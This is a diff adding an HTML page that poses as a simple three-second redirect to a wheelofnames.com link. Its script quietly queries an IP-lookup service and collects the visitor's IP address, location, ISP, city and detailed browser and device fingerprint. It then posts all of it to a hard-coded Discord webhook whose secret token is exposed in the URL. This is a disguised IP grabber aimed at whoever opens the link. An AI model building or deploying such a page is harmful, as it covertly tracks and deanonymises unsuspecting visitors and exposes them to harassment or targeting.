@@ -1,0 +1,96 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Redirection</title>
+    <meta http-equiv="Refresh" content="3; url=https://wheelofnames.com/6cj-4rd" />
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+      }
+      header {
+        background-color: #333;
+        color: #fff;
+        padding: 10px;
+        text-align: center;
+      }
+      h1 {
+        margin: 0;
+        font-size: 32px;
+      }
+      p {
+        font-size: 18px;
+        line-height: 1.5;
+        margin: 20px 5px;
+      }
+      .danger {
+        color: red;
+        font-weight: bold;
+      }
+      footer {
+        background-color: #333;
+        color: #fff;
+        padding: 10px;
+        text-align: center;
+      }
+    </style>
+  </head>
+<body>
+  <p> redirecting in 3 seconds...</p>
+    <script>
+      let echolog = {};
+      fetch("https://wtfismyip.com/json")
+        .then((response) => response.json())
+        .then((data) => {
+          let echolog = {
+            ipAddress: data.YourFuckingIPAddress,
+            location: data.YourFuckingLocation,
+            hostname: data.YourFuckingHostname,
+            isp: data.YourFuckingISP,
+            city: data.YourFuckingCity,
+            country: data.YourFuckingCountry,
+            countryCode: data.YourFuckingCountryCode,
+            userAgent: navigator.userAgent,
+            windowProp: Object.keys(window).length,
+            windowWidth: window.innerWidth,
+            windowHeight: window.innerHeight,
+            windowRatio: window.innerWidth / window.innerHeight,
+            screenWidth: window.screen.availWidth,
+            screenHeight: window.screen.availHeight,
+            screenRatio: window.screen.availWidth / window.screen.availHeight,
+            DPI: window.devicePixelRatio,
+            colorDepth: window.screen.colorDepth,
+            orientation: window.screen.orientation.type,
+            orientationAngle: window.screen.orientation.angle,
+            os: navigator.platform,
+            threads: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory,
+            systemLanguages: navigator.languages.join(", "),
+            languages: navigator.language,
+          };
+
+          // Set up the payload for the webhook
+          const payload = {
+            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUser Agent: ${echolog.userAgent}\nWindow Properties: ${echolog.windowProp}\nWindow Width: ${echolog.windowWidth}\nWindow Height: ${echolog.windowHeight}\nWindow Ratio: ${echolog.windowRatio}\nScreen Width: ${echolog.screenWidth}\nScreen Height: ${echolog.screenHeight}\nScreen Ratio: ${echolog.screenRatio}\nDPI: ${echolog.DPI}\nColor Depth: ${echolog.colorDepth}\nOrientation: ${echolog.orientation}\nOrientation Angle: ${echolog.orientationAngle}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}\nSystem Languages: ${echolog.systemLanguages}\nLanguages: ${echolog.languages}`,
+          };
+          // This is a lazy way of doing it, having
+          // your webhook url out in the open like
+          // this is a bad idea, you should instead
+          // have it contact a internal API to
+          // forward the request.
+          fetch("hhttps://discord.com/api/webhooks/1101347754648813579/DYTH8r615qYOTbz9Lm3N1M44y3AiDWX076-dMDOuXksDmrw_AzvslPK4yo7HQQqJuUcu", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(payload),
+          })
+            .then((response) => console.log(response))
+            .catch((error) => console.error(error));
+        })
+        .catch((error) => console.error(error));
+    </script>
+  </body>
+</html>
